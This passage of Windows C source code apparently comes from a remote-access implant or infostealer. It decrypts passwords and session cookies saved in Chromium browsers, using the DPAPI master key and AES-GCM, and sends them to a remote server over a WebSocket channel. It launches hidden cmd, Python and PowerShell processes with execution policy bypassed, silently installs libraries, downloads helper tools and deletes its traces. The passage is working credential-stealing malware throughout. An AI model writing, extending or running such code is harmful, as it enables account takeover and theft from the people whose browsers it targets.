        BYTE* plaintext = (BYTE*)malloc(ct_len + 1);
        int pt_len = aes_gcm_decrypt(master_key, key_len, iv, iv_len, ciphertext, ct_len, tag, 16, plaintext);
        
        if (pt_len > 0 && pt_len < max_out) {
            memcpy(output, plaintext, pt_len);
            output[pt_len] = 0;
            free(plaintext);
            return pt_len;
        }
        free(plaintext);
        return 0;
    } else {
        // Old DPAPI encryption
        DATA_BLOB in_blob, out_blob;
        in_blob.pbData = encrypted;
        in_blob.cbData = enc_len;
        
        if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
            int len = out_blob.cbData < max_out - 1 ? out_blob.cbData : max_out - 1;
            memcpy(output, out_blob.pbData, len);
            output[len] = 0;
            LocalFree(out_blob.pbData);
            return len;
        }
        return 0;
    }
}

// Hex string to bytes
static int hex_to_bytes(const char* hex, BYTE* bytes, int max_len) {
    int len = strlen(hex);
    int out_len = 0;
    for (int i = 0; i < len && out_len < max_len; i += 2) {
        int val = 0;
        if (hex[i] >= '0' && hex[i] <= '9') val = (hex[i] - '0') << 4;
        else if (hex[i] >= 'A' && hex[i] <= 'F') val = (hex[i] - 'A' + 10) << 4;
        else if (hex[i] >= 'a' && hex[i] <= 'f') val = (hex[i] - 'a' + 10) << 4;
        
        if (hex[i+1] >= '0' && hex[i+1] <= '9') val |= (hex[i+1] - '0');
        else if (hex[i+1] >= 'A' && hex[i+1] <= 'F') val |= (hex[i+1] - 'A' + 10);
        else if (hex[i+1] >= 'a' && hex[i+1] <= 'f') val |= (hex[i+1] - 'a' + 10);
        
        bytes[out_len++] = val;
    }
    return out_len;
}

// Helper to copy locked file to temp and then download it to server
static void extract_and_download(const char* src_path, const char* dest_name) {
    char temp_path[MAX_PATH];
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_path, sizeof(temp_path), "%s\\%s", temp_dir, dest_name);
    
    if (copy_file_safe(src_path, temp_path)) {
        char msg[256];
        snprintf(msg, sizeof(msg), "[+] Downloading: %s\n", dest_name);
        send_websocket_data(msg, strlen(msg));
        download_file(temp_path);
        DeleteFileA(temp_path);  // Clean up temp file
    }
}

// ============== PURE C BROWSER CREDENTIAL EXTRACTION ==============
// Using Python with fallback to SQLite3 CLI for proper BLOB handling

// Extract and decrypt cookies using embedded Python (proven to work)
static void extract_cookies_by_domain(const char* browser_name, const char* local_state_path, const char* cookies_db_path) {
    char temp_dir[MAX_PATH];
    char temp_db[MAX_PATH];
    char temp_output[MAX_PATH];
    char py_script[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_db, sizeof(temp_db), "%s\\temp_ck_%s.db", temp_dir, browser_name);
    snprintf(temp_output, sizeof(temp_output), "%s\\%s_cookies.txt", temp_dir, browser_name);
    snprintf(py_script, sizeof(py_script), "%s\\.decrypt_ck.py", temp_dir);
    
    // Check if Cookies db exists
    if (GetFileAttributesA(cookies_db_path) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Copy locked database to temp
    if (!copy_file_safe(cookies_db_path, temp_db)) {
        return;
    }
    
    // Check if Local State exists
    if (GetFileAttributesA(local_state_path) == INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(temp_db);
        return;
    }
    
    // Create Python script for cookie extraction
    FILE* pf = fopen(py_script, "w");
    if (!pf) {
        DeleteFileA(temp_db);
        return;
    }
    
    fprintf(pf, "#!/usr/bin/env python3\n");
    fprintf(pf, "import os, sys, json, base64, sqlite3, shutil\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    from Crypto.Cipher import AES\n");
    fprintf(pf, "except ImportError:\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        import subprocess\n");
    fprintf(pf, "        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodome', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n");
    fprintf(pf, "        from Crypto.Cipher import AES\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        sys.exit(1)\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    import win32crypt\n");
    fprintf(pf, "except ImportError:\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        import subprocess\n");
    fprintf(pf, "        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n");
    fprintf(pf, "        import win32crypt\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        sys.exit(1)\n");
    fprintf(pf, "\n");
    fprintf(pf, "def get_key(local_state_path):\n");
    fprintf(pf, "    with open(local_state_path, 'r', encoding='utf-8') as f:\n");
    fprintf(pf, "        local_state = json.load(f)\n");
    fprintf(pf, "    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])\n");
    fprintf(pf, "    encrypted_key = encrypted_key[5:]\n");
    fprintf(pf, "    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]\n");
    fprintf(pf, "\n");
    fprintf(pf, "def decrypt_cookie(encrypted_value, key):\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':\n");
    fprintf(pf, "            iv = encrypted_value[3:15]\n");
    fprintf(pf, "            payload = encrypted_value[15:-16]\n");
    fprintf(pf, "            cipher = AES.new(key, AES.MODE_GCM, iv)\n");
    fprintf(pf, "            return cipher.decrypt(payload).decode('utf-8', errors='ignore')\n");
    fprintf(pf, "        else:\n");
    fprintf(pf, "            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        return ''\n");
    fprintf(pf, "\n");
    fprintf(pf, "local_state = r'%s'\n", local_state_path);
    fprintf(pf, "cookies_db = r'%s'\n", temp_db);
    fprintf(pf, "output = r'%s'\n", temp_output);
    fprintf(pf, "browser = '%s'\n", browser_name);
    fprintf(pf, "\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    key = get_key(local_state)\n");
    fprintf(pf, "    conn = sqlite3.connect(cookies_db)\n");
    fprintf(pf, "    cursor = conn.cursor()\n");
    fprintf(pf, "    cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies')\n");
    fprintf(pf, "    results = []\n");
    fprintf(pf, "    for row in cursor.fetchall():\n");
    fprintf(pf, "        host, name, encrypted_value, path, expires, secure = row\n");
    fprintf(pf, "        if encrypted_value:\n");
    fprintf(pf, "            value = decrypt_cookie(encrypted_value, key)\n");
    fprintf(pf, "            if value:\n");
    fprintf(pf, "                results.append((host, name, value, path, expires, secure))\n");
    fprintf(pf, "    conn.close()\n");
    fprintf(pf, "    \n");
    fprintf(pf, "    with open(output, 'w', encoding='utf-8') as f:\n");
    fprintf(pf, "        f.write('# Netscape HTTP Cookie File\\n')\n");
    fprintf(pf, "        f.write(f'# {browser} Cookies - Import with EditThisCookie or Cookie-Editor\\n\\n')\n");
    fprintf(pf, "        for host, name, value, path, expires, secure in results:\n");
    fprintf(pf, "            subdomain = 'TRUE' if host.startswith('.') else 'FALSE'\n");
    fprintf(pf, "            is_secure = 'TRUE' if secure else 'FALSE'\n");
    fprintf(pf, "            f.write(f'{host}\\t{subdomain}\\t{path}\\t{is_secure}\\t{expires}\\t{name}\\t{value}\\n')\n");
    fprintf(pf, "    print(f'SUCCESS:{len(results)}')\n");
    fprintf(pf, "except Exception as e:\n");
    fprintf(pf, "    print(f'ERROR:{e}')\n");
    fprintf(pf, "    sys.exit(1)\n");
    
    fclose(pf);
    
    // Run Python script
    char py_cmd[MAX_PATH * 3];
    snprintf(py_cmd, sizeof(py_cmd), "python \"%s\" 2>nul", py_script);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    char cmd[MAX_PATH * 4];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", py_cmd);
    
    int py_success = 0;
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD exit_code = 0;
        WaitForSingleObject(pi.hProcess, 120000);
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        if (exit_code == 0 && GetFileAttributesA(temp_output) != INVALID_FILE_ATTRIBUTES) {
            py_success = 1;
        }
    }
    
    if (py_success) {
        char msg[256];
        snprintf(msg, sizeof(msg), "[+] %s: Cookies extracted\n", browser_name);
        send_websocket_data(msg, strlen(msg));
        download_file(temp_output);
    } else {
        // Python failed - try C fallback
        char msg[256];
        snprintf(msg, sizeof(msg), "[!] %s: Python not available for cookies, using C fallback\n", browser_name);
        send_websocket_data(msg, strlen(msg));
        
        int key_len = 0;
        BYTE* master_key = get_chromium_master_key(local_state_path, &key_len);
        if (master_key && key_len == 32) {
            char sqlite_path[MAX_PATH];
            char query_output[MAX_PATH];
            snprintf(sqlite_path, sizeof(sqlite_path), "%s\\.sq3.exe", temp_dir);
            snprintf(query_output, sizeof(query_output), "%s\\ck_query_%s.txt", temp_dir, browser_name);
            
            // Download sqlite3 if needed
            if (GetFileAttributesA(sqlite_path) == INVALID_FILE_ATTRIBUTES) {
                char ps_cmd[1024];
                snprintf(ps_cmd, sizeof(ps_cmd),
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
                    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
                    "$u='https://www.sqlite.org/2024/sqlite-tools-win-x64-3450100.zip';"
                    "$z=Join-Path $env:TEMP '.sq.zip';$e=Join-Path $env:TEMP '.sqtmp';"
                    "(New-Object Net.WebClient).DownloadFile($u,$z);"
                    "Expand-Archive -Path $z -DestinationPath $e -Force;"
                    "$f=Get-ChildItem -Path $e -Recurse -Filter 'sqlite3.exe'|Select -First 1;"
                    "if($f){Copy-Item $f.FullName '%s' -Force};"
                    "Remove-Item $z,$e -Recurse -Force -EA SilentlyContinue\"",
                    sqlite_path);
                
                STARTUPINFOA si2;
                PROCESS_INFORMATION pi2;
                ZeroMemory(&si2, sizeof(si2));
                si2.cb = sizeof(si2);
                si2.dwFlags = STARTF_USESHOWWINDOW;
                si2.wShowWindow = SW_HIDE;
                ZeroMemory(&pi2, sizeof(pi2));
                
                if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
                    WaitForSingleObject(pi2.hProcess, 120000);
                    CloseHandle(pi2.hProcess);
                    CloseHandle(pi2.hThread);
                }
            }
            
            // Query cookies
            char query_cmd[2048];
            snprintf(query_cmd, sizeof(query_cmd),
                "\"%s\" \"%s\" \".headers off\" \".mode list\" \".separator |\" \"SELECT host_key, name, hex(encrypted_value), path, expires_utc, is_secure FROM cookies WHERE length(encrypted_value) > 0;\" > \"%s\" 2>nul",
                sqlite_path, temp_db, query_output);
            
            STARTUPINFOA si3;
            PROCESS_INFORMATION pi3;
            ZeroMemory(&si3, sizeof(si3));
            si3.cb = sizeof(si3);
            si3.dwFlags = STARTF_USESHOWWINDOW;
            si3.wShowWindow = SW_HIDE;
            ZeroMemory(&pi3, sizeof(pi3));
            
            char cmd3[2200];
            snprintf(cmd3, sizeof(cmd3), "cmd.exe /c %s", query_cmd);
            
            if (CreateProcessA(NULL, cmd3, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si3, &pi3)) {
                WaitForSingleObject(pi3.hProcess, 60000);
                CloseHandle(pi3.hProcess);
                CloseHandle(pi3.hThread);
            }
            
            FILE* qf = fopen(query_output, "r");
            FILE* out = fopen(temp_output, "w");
            
            if (qf && out) {
                fprintf(out, "# Netscape HTTP Cookie File\n");
                fprintf(out, "# %s cookies - Import with EditThisCookie or Cookie-Editor\n\n", browser_name);
                
                char line[16384];
                int count = 0;
                while (fgets(line, sizeof(line), qf)) {
                    // Parse from the end: host|name|hex|path|expires|secure
                    char* secure_pos = strrchr(line, '|');
                    if (!secure_pos) continue;
                    char* secure = secure_pos + 1;
                    *secure_pos = 0;
                    
                    char* expires_pos = strrchr(line, '|');
                    if (!expires_pos) continue;
                    char* expires = expires_pos + 1;
                    *expires_pos = 0;
                    
                    char* path_pos = strrchr(line, '|');
                    if (!path_pos) continue;
                    char* path = path_pos + 1;
                    *path_pos = 0;
                    
                    char* hex_pos = strrchr(line, '|');
                    if (!hex_pos) continue;
                    char* hex_val = hex_pos + 1;
                    *hex_pos = 0;
                    
                    char* name_pos = strrchr(line, '|');
                    if (!name_pos) continue;
                    char* name = name_pos + 1;
                    *name_pos = 0;
                    
                    char* host = line;
                    
                    secure[strcspn(secure, "\r\n")] = 0;
                    
                    int hex_len = strlen(hex_val);
                    if (hex_len < 6) continue;
                    
                    int enc_len = hex_len / 2;
                    BYTE* encrypted = (BYTE*)malloc(enc_len + 1);
                    hex_to_bytes(hex_val, encrypted, enc_len);
                    
                    char decrypted[8192] = {0};
                    int dec_len = decrypt_chromium_value(encrypted, enc_len, master_key, key_len, decrypted, sizeof(decrypted));
                    free(encrypted);
                    
                    if (dec_len > 0 && strlen(decrypted) > 0) {
                        const char* subdomain = (host[0] == '.') ? "TRUE" : "FALSE";
                        const char* is_secure = (strcmp(secure, "1") == 0) ? "TRUE" : "FALSE";
                        fprintf(out, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n", 
                                host, subdomain, path, is_secure, expires, name, decrypted);
                        count++;
                    }
                }
                
                fclose(qf);
                fclose(out);
                
                if (count > 0) {
                    char msg2[256];
                    snprintf(msg2, sizeof(msg2), "[+] %s: Extracted %d cookies (C fallback)\n", browser_name, count);
                    send_websocket_data(msg2, strlen(msg2));
                    download_file(temp_output);
                }
            } else {
                if (qf) fclose(qf);
                if (out) fclose(out);
            }
            
            DeleteFileA(query_output);
            free(master_key);
        } else {
            if (master_key) free(master_key);
        }
    }
    
    DeleteFileA(py_script);
    DeleteFileA(temp_output);
    DeleteFileA(temp_db);
}

// Decrypt Chrome/Edge passwords using embedded Python (proven to work)
// This creates a Python script that handles everything correctly
static void decrypt_chromium_passwords(const char* browser_name, const char* local_state_path, const char* login_data_path, const char* output_name) {
    char temp_dir[MAX_PATH];
    char temp_db[MAX_PATH];
    char temp_output[MAX_PATH];
    char py_script[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_db, sizeof(temp_db), "%s\\temp_pw_%s.db", temp_dir, browser_name);
    snprintf(temp_output, sizeof(temp_output), "%s\\%s", temp_dir, output_name);
    snprintf(py_script, sizeof(py_script), "%s\\.decrypt_pw.py", temp_dir);
    
    // Check if Login Data exists
    if (GetFileAttributesA(login_data_path) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Copy locked database to temp
    if (!copy_file_safe(login_data_path, temp_db)) {
        return;
    }
    
    // Check if Local State exists
    if (GetFileAttributesA(local_state_path) == INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(temp_db);
        return;
    }
    
    // Create Python script that handles everything
    FILE* pf = fopen(py_script, "w");
    if (!pf) {
        DeleteFileA(temp_db);
        return;
    }
    
    fprintf(pf, "#!/usr/bin/env python3\n");
    fprintf(pf, "import os, sys, json, base64, sqlite3, shutil\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    from Crypto.Cipher import AES\n");
    fprintf(pf, "except ImportError:\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        import subprocess\n");
    fprintf(pf, "        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodome', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n");
    fprintf(pf, "        from Crypto.Cipher import AES\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        sys.exit(1)\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    import win32crypt\n");
    fprintf(pf, "except ImportError:\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        import subprocess\n");
    fprintf(pf, "        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n");
    fprintf(pf, "        import win32crypt\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        sys.exit(1)\n");
    fprintf(pf, "\n");
    fprintf(pf, "def get_key(local_state_path):\n");
    fprintf(pf, "    with open(local_state_path, 'r', encoding='utf-8') as f:\n");
    fprintf(pf, "        local_state = json.load(f)\n");
    fprintf(pf, "    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])\n");
    fprintf(pf, "    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix\n");
    fprintf(pf, "    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]\n");
    fprintf(pf, "\n");
    fprintf(pf, "def decrypt_password(encrypted_password, key):\n");
    fprintf(pf, "    try:\n");
    fprintf(pf, "        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':\n");
    fprintf(pf, "            iv = encrypted_password[3:15]\n");
    fprintf(pf, "            payload = encrypted_password[15:-16]\n");
    fprintf(pf, "            cipher = AES.new(key, AES.MODE_GCM, iv)\n");
    fprintf(pf, "            return cipher.decrypt(payload).decode('utf-8', errors='ignore')\n");
    fprintf(pf, "        else:\n");
    fprintf(pf, "            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')\n");
    fprintf(pf, "    except:\n");
    fprintf(pf, "        return ''\n");
    fprintf(pf, "\n");
    fprintf(pf, "local_state = r'%s'\n", local_state_path);
    fprintf(pf, "login_db = r'%s'\n", temp_db);
    fprintf(pf, "output = r'%s'\n", temp_output);
    fprintf(pf, "browser = '%s'\n", browser_name);
    fprintf(pf, "\n");
    fprintf(pf, "try:\n");
    fprintf(pf, "    key = get_key(local_state)\n");
    fprintf(pf, "    conn = sqlite3.connect(login_db)\n");
    fprintf(pf, "    cursor = conn.cursor()\n");
    fprintf(pf, "    cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n");
    fprintf(pf, "    results = []\n");
    fprintf(pf, "    for row in cursor.fetchall():\n");
    fprintf(pf, "        url, username, encrypted_password = row\n");
    fprintf(pf, "        if encrypted_password:\n");
    fprintf(pf, "            password = decrypt_password(encrypted_password, key)\n");
    fprintf(pf, "            if password:\n");
    fprintf(pf, "                results.append((url, username, password))\n");
    fprintf(pf, "    conn.close()\n");
    fprintf(pf, "    \n");
    fprintf(pf, "    with open(output, 'w', encoding='utf-8') as f:\n");
    fprintf(pf, "        f.write(f'=== {browser.upper()} PASSWORDS ===\\n\\n')\n");
    fprintf(pf, "        for url, username, password in results:\n");
    fprintf(pf, "            f.write(f'URL: {url}\\n')\n");
    fprintf(pf, "            f.write(f'Username: {username}\\n')\n");
    fprintf(pf, "            f.write(f'Password: {password}\\n')\n");
    fprintf(pf, "            f.write('---\\n')\n");
    fprintf(pf, "        f.write(f'\\nTotal: {len(results)} passwords\\n')\n");
    fprintf(pf, "    print(f'SUCCESS:{len(results)}')\n");
    fprintf(pf, "except Exception as e:\n");
    fprintf(pf, "    print(f'ERROR:{e}')\n");
    fprintf(pf, "    sys.exit(1)\n");
    
    fclose(pf);
    
    // Run Python script
    char py_cmd[MAX_PATH * 3];
    snprintf(py_cmd, sizeof(py_cmd), "python \"%s\" 2>nul", py_script);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    char cmd[MAX_PATH * 4];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", py_cmd);
    
    int py_success = 0;
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD exit_code = 0;
        WaitForSingleObject(pi.hProcess, 120000);  // 2 min timeout for pip install
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        if (exit_code == 0 && GetFileAttributesA(temp_output) != INVALID_FILE_ATTRIBUTES) {
            py_success = 1;
        }
    }
    
    // If Python worked, download the file
    if (py_success) {
        char msg[256];
        snprintf(msg, sizeof(msg), "[+] %s: Passwords extracted\n", browser_name);
        send_websocket_data(msg, strlen(msg));
        download_file(temp_output);
    } else {
        // Python failed - try C fallback with detailed error
        char msg[256];
        snprintf(msg, sizeof(msg), "[!] %s: Python not available, using C fallback\n", browser_name);
        send_websocket_data(msg, strlen(msg));
        
        // C fallback using BCrypt
        int key_len = 0;
        BYTE* master_key = get_chromium_master_key(local_state_path, &key_len);
        if (master_key && key_len == 32) {
            char sqlite_path[MAX_PATH];
            char query_output[MAX_PATH];
            snprintf(sqlite_path, sizeof(sqlite_path), "%s\\.sq3.exe", temp_dir);
            snprintf(query_output, sizeof(query_output), "%s\\pw_query_%s.txt", temp_dir, browser_name);
            
            // Download sqlite3 if needed
            if (GetFileAttributesA(sqlite_path) == INVALID_FILE_ATTRIBUTES) {
                char ps_cmd[1024];
                snprintf(ps_cmd, sizeof(ps_cmd),
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
                    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
                    "$u='https://www.sqlite.org/2024/sqlite-tools-win-x64-3450100.zip';"
                    "$z=Join-Path $env:TEMP '.sq.zip';$e=Join-Path $env:TEMP '.sqtmp';"
                    "(New-Object Net.WebClient).DownloadFile($u,$z);"
                    "Expand-Archive -Path $z -DestinationPath $e -Force;"
                    "$f=Get-ChildItem -Path $e -Recurse -Filter 'sqlite3.exe'|Select -First 1;"
                    "if($f){Copy-Item $f.FullName '%s' -Force};"
                    "Remove-Item $z,$e -Recurse -Force -EA SilentlyContinue\"",
                    sqlite_path);
                
                STARTUPINFOA si2;
                PROCESS_INFORMATION pi2;
                ZeroMemory(&si2, sizeof(si2));
                si2.cb = sizeof(si2);
                si2.dwFlags = STARTF_USESHOWWINDOW;
                si2.wShowWindow = SW_HIDE;
                ZeroMemory(&pi2, sizeof(pi2));
                
                if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
                    WaitForSingleObject(pi2.hProcess, 120000);
                    CloseHandle(pi2.hProcess);
                    CloseHandle(pi2.hThread);
                }
            }
            
            // Query database
            char query_cmd[2048];
            snprintf(query_cmd, sizeof(query_cmd),
                "\"%s\" \"%s\" \".headers off\" \".mode list\" \".separator |\" \"SELECT action_url, username_value, hex(password_value) FROM logins WHERE length(password_value) > 0;\" > \"%s\" 2>nul",
                sqlite_path, temp_db, query_output);
            
            STARTUPINFOA si3;
            PROCESS_INFORMATION pi3;
            ZeroMemory(&si3, sizeof(si3));
            si3.cb = sizeof(si3);
            si3.dwFlags = STARTF_USESHOWWINDOW;
            si3.wShowWindow = SW_HIDE;
            ZeroMemory(&pi3, sizeof(pi3));
            
            char cmd3[2200];
            snprintf(cmd3, sizeof(cmd3), "cmd.exe /c %s", query_cmd);
            
            if (CreateProcessA(NULL, cmd3, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si3, &pi3)) {
                WaitForSingleObject(pi3.hProcess, 60000);
                CloseHandle(pi3.hProcess);
                CloseHandle(pi3.hThread);
            }
            
            FILE* qf = fopen(query_output, "r");
            FILE* out = fopen(temp_output, "w");
            
            if (qf && out) {
                fprintf(out, "=== %s PASSWORDS ===\n\n", browser_name);
                
                char line[8192];
                int count = 0;
                while (fgets(line, sizeof(line), qf)) {
                    // Parse: url|username|hex_password
                    char* url = line;
                    char* last_pipe = strrchr(line, '|');
                    if (!last_pipe) continue;
                    
                    char* hex_pass = last_pipe + 1;
                    *last_pipe = 0;
                    
                    // Find second-to-last pipe for username
                    char* second_pipe = strrchr(url, '|');
                    if (!second_pipe) continue;
                    
                    char* username = second_pipe + 1;
                    *second_pipe = 0;
                    
                    hex_pass[strcspn(hex_pass, "\r\n")] = 0;
                    
                    int hex_len = strlen(hex_pass);
                    if (hex_len < 6) continue;
                    
                    int enc_len = hex_len / 2;
                    BYTE* encrypted = (BYTE*)malloc(enc_len + 1);
                    hex_to_bytes(hex_pass, encrypted, enc_len);
                    
                    char decrypted[2048] = {0};
                    int dec_len = decrypt_chromium_value(encrypted, enc_len, master_key, key_len, decrypted, sizeof(decrypted));
                    free(encrypted);
                    
                    if (dec_len > 0 && strlen(decrypted) > 0) {
                        fprintf(out, "URL: %s\n", url);
                        fprintf(out, "Username: %s\n", username);
                        fprintf(out, "Password: %s\n", decrypted);
                        fprintf(out, "---\n");
                        count++;
                    }
                }
                
                fclose(qf);
                fclose(out);
                
                if (count > 0) {
                    char msg2[256];
                    snprintf(msg2, sizeof(msg2), "[+] %s: Extracted %d passwords (C fallback)\n", browser_name, count);
                    send_websocket_data(msg2, strlen(msg2));
                    download_file(temp_output);
                }
            } else {
                if (qf) fclose(qf);
                if (out) fclose(out);
            }
            
            DeleteFileA(query_output);
            free(master_key);
        } else {
            if (master_key) free(master_key);
        }
    }
    
    DeleteFileA(py_script);
    DeleteFileA(temp_output);
    DeleteFileA(temp_db);
}

// Helper function to download a file via WinINet
int download_file_wininet(const char* url, const char* dest_path, DWORD* bytes_downloaded) {
    *bytes_downloaded = 0;
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return 0;
    }
    
    HANDLE hFile = CreateFileA(dest_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
        FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return 0;
    }
    
    char buffer[8192];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
        *bytes_downloaded += bytesRead;
    }
    
    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return *bytes_downloaded > 0;
}

// Helper: Handle incoming WebSocket ping frames and respond with pong
// This keeps the connection alive during long-running operations
void handle_pending_pings() {
    if (!g_connected || g_sock == INVALID_SOCKET) return;
    
    fd_set readfds;
    struct timeval tv;
    
    // Check if there's data waiting
    FD_ZERO(&readfds);
    FD_SET(g_sock, &readfds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;  // Non-blocking check
    
    if (select(0, &readfds, NULL, NULL, &tv) > 0) {
        unsigned char buffer[256];
        int received = recv(g_sock, (char*)buffer, sizeof(buffer), MSG_PEEK);
        
        if (received > 0 && (buffer[0] & 0x0F) == 0x09) {
            // It's a ping frame - receive and respond
            received = recv(g_sock, (char*)buffer, sizeof(buffer), 0);
            if (received >= 2) {
                int pos = 0;
                unsigned char opcode = buffer[pos++] & 0x0F;
                
                if (opcode == 0x09) {  // Ping
                    int masked = (buffer[pos] & 0x80) != 0;
                    int payload_len = buffer[pos++] & 0x7F;
                    
                    unsigned char mask[4] = {0};
                    if (masked && received >= pos + 4) {
                        for (int i = 0; i < 4; i++) mask[i] = buffer[pos++];
                    }
                    
                    // Decode ping payload
                    unsigned char ping_payload[125];
                    for (int i = 0; i < payload_len && i < 125; i++) {
                        ping_payload[i] = masked ? (buffer[pos + i] ^ mask[i % 4]) : buffer[pos + i];
                    }
                    
                    // Send pong response
                    unsigned char pong[135];
                    int pong_len = 0;
                    pong[pong_len++] = 0x8A;  // Pong frame
                    pong[pong_len++] = 0x80 | payload_len;
                    
                    unsigned char pong_mask[4];
                    for (int i = 0; i < 4; i++) pong[pong_len++] = pong_mask[i] = rand() % 256;
                    
                    for (int i = 0; i < payload_len; i++) {
                        pong[pong_len++] = ping_payload[i] ^ pong_mask[i % 4];
                    }
                    
                    send(g_sock, (char*)pong, pong_len, 0);
                }
            }
        }
    }
}

// Wait for process while keeping WebSocket connection alive
// Checks for ping frames every 5 seconds during the wait
DWORD wait_process_keepalive(HANDLE hProcess, DWORD timeout_ms) {
    DWORD start = GetTickCount();
    DWORD elapsed = 0;
    
    while (elapsed < timeout_ms) {
        // Wait for 5 seconds or until process exits
        DWORD wait_result = WaitForSingleObject(hProcess, 5000);
        
        if (wait_result == WAIT_OBJECT_0) {
            // Process exited
            return WAIT_OBJECT_0;
        }
        
        // Process still running - handle any pending pings
        handle_pending_pings();
        
        // Also send our own ping to keep connection active
        send_ping_direct();
        
        elapsed = GetTickCount() - start;
    }
    
    return WAIT_TIMEOUT;
}

// Send all files from a directory
int send_directory_files(const char* dir_path, int delete_after) {
    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir_path);
    HANDLE hFind = FindFirstFileA(search_path, &find_data);
    
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    
    int file_count = 0;
    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[MAX_PATH];
            snprintf(file_path, sizeof(file_path), "%s\\%s", dir_path, find_data.cFileName);
            
